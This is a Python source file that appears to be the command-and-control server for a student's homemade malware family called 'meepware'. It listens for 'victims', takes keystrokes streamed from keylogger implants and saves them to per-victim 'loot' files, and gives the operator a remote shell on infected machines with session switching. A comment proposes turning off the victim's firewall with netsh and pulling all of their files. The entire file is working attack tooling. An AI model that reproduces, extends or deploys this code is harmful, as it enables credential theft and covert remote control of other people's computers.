import socket
import _thread
import os
# TODO: writing command history to log files
# TODO: track meeplogger connections
# c5: command control cabal chaos corrosive
# Next code words: "the potato manual", "just make c4", "bozu", "nil is goated"
# Tenchi's suggestions: TODO: beacons, re-establish connections formally

# Aggressive auto-attack ideas:
# -Create python server and aggressively download all files (combine with: netsh advfirewall set allprofiles state off)

# data structures for connected sessions
sessionsDict = {}
sessionsList = []
sessionsNames = []


def handler(handler_socket, addr):
    # thread started by each connection
    # create loot folder based on IP
    print("\nAttempting to create loot folder...")
    current_directory = os.getcwd()
    final_directory = os.path.join(current_directory, str(addr[0]) + "_" + str(addr[1]))
    if not os.path.exists(final_directory):
        os.makedirs(final_directory)
        print("\nLoot folder created :)\n")
    else:
        print("\nLoot folder already exists! :)\n")

    # determine what kind of meepware is connecting via codewords
    connectionType = handler_socket.recv(1024).decode()
    if connectionType == "wire":
        print("\nMEEPLOGGERPLUS connection detected :)\n")
        meeplogger(handler_socket, addr)
    elif connectionType == "based":
        print("\nMEEPLOGGERADVANCED connection detected :)\n")
        meeplogger(handler_socket, addr)
    elif connectionType == "meepster":
        print("\nMEEPSHELL connection detected :)\n")
        add_session(handler_socket, addr)
    else:
        print("Meepware not authenticated :(")


def meeplogger(connection, addr):
    # TODO change this path
    # appends keys to loot file & creates if non-existent
    with open(str(addr[0]) + "/" + str(addr[0]) + "_loot.txt", 'a+') as loot:
        try:
            while True:
                temp = connection.recv(1024).decode()
                # test print statement for incoming keys
                print("Incoming keys from: " + str(addr) + "\n" + temp)
                loot.write(temp)
                if temp == "":
                    print("Connection closed :(")
                    break
        except socket.error as e:
            print("\nERROR :(\nClosing connection to victim: " + str(addr) + "\nError:\n" + e)
            connection.close()


def shell(connection, addr):
    # sends commands and receives output from shells
    # enables session switching
    try:
        while True:
            command = input("\nEnter command to execute on " + str(addr[0]) + ":" + str(addr[1]) + ":\n")
            if command.upper() == "EXIT":
                break
            connection.send(command.encode())
            output = connection.recv(1024).decode()
            print("\nOutput from " + str(addr[0]) + ":" + str(addr[1]) + ": \n")
            print(output)
    except:
        print("\nERROR\nConnection lost :(\n")
        remove_session(connection, addr)


def add_session(connection, addr):
    # add session to data structures
    if addr not in sessionsDict:
        sessionsDict[addr] = connection
        temp = connection.recv(1024).decode()
        sessionsNames.append(temp)
        for i, (j, k) in enumerate(sessionsDict.items()):
            if j not in sessionsList:
                sessionsList.append(j)


def remove_session(connection, addr):
    # remove session from data structures
    try:
        # removes unique directory if empty for QoL
        current_directory = os.getcwd()
        final_directory = os.path.join(current_directory, str(addr[0]) + "_" + str(addr[1]))
        os.rmdir(final_directory)
    except OSError:
        pass
    sessionsDict.pop(addr)
    index = sessionsList.index(addr)
    sessionsNames.pop(index)
    sessionsList.pop(index)
    connection.close()


def sessions():
    # session switching handler
    # uses data structures to pass socket object & address tuple to shell function
    while True:
        if len(sessionsList) > 0:
            print("\nWhich session would you like to connect to?")
            for i in range(len(sessionsList)):
                addr = sessionsList[i]
                print(str(i+1) + " - " + str(addr[0]) + ":" + str(addr[1]) + " (" + sessionsNames[i] + ")")
            try:
                selection = int(input())
                if selection > len(sessionsList) or selection <= 0:
                    print("Please choose a valid number")
                else:
                    shell(sessionsDict[sessionsList[selection - 1]], sessionsList[selection - 1])
            # TODO add except for data type
            # as cool as broad/empty excepts are, I shouldn't use them this much
            except:
                print("Please choose a valid number")


def main():
    # create socket, set hostname (& convert to ip) and port
    s = socket.socket()
    hostname = "{ddns}.student.rit.edu"
    ip = socket.gethostbyname(hostname)
    # the 'meep' port
    # m = 13, e = 3 + 3 = 6, p = 16
    port = 13616

    # bind to port and listen
    s.bind((ip, port))
    s.listen(5)
    print("Listening for victims...\n\n")

    global sessionsDict, sessionsList, sessionsNames
    # start session handling/switching
    _thread.start_new_thread(sessions, ())

    # loop listens for new victims and starts thread for each connection
    while True:
        client_socket, address = s.accept()
        print("\nNEW VICTIM from: " + repr(address))

        _thread.start_new_thread(handler, (client_socket, address))
        print("\nListening for victims...\n")


if __name__ == '__main__':
    main()
